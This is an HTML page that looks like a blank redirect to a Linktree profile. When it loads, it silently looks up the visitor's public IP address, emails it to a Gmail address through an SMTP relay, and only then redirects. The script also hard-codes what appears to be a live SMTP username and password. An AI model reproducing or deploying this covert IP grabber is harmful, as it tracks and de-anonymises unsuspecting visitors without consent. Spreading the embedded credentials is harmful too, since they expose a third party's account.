<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            background-color: black;
        }

    </style>
</head>
<body>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
		// Function to handle redirection with a delay
		function redirectWithDelay(url, delay) {
			setTimeout(function() {
				window.location.href = url;
			}, delay);  // Delay in milliseconds
		}
		
        // Function to send email
        function sendEmail(ip) {
            console.log("Sending IP address via email...");

            Email.send({
                Host: "smtp.elasticemail.com",  // Ensure this is the correct SMTP host
                Username: "avagoji@gmail.com",  // Replace with your SMTP username
                Password: "38843C237E5E26B5B04AF48209C6BC62679D",  // Replace with your SMTP password
                To: 'avagoji@gmail.com',  // Replace with the recipient's email address
                From: "avagoji@gmail.com",  // Ensure this matches the SMTP username
                Subject: "SOMEONES IP Address:" + ip,
                Body: "You have a visitor!"
            }).then(
                message => {
                    console.log("Email sent successfully!");
                    console.log("Response:", message);
                }
            ).catch(
                error => {
                    console.error("Failed to send email:", error);
                }
            );
        }
		

        // Fetch the user's IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                console.log('Your Public IP Address:', data.ip);
                
                // Send email with the IP address
                sendEmail(data.ip);
                
                // Redirect after IP address retrieval
                redirectWithDelay("https://linktr.ee/piolos", 2500);  // 2500 ms = 2 seconds
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
                
                // Redirect even if IP retrieval fails (optional)
                redirectWithDelay("https://linktr.ee/piolos", 2500);  // 2500 ms = 2 seconds
            });
    </script>
</body>
</html>
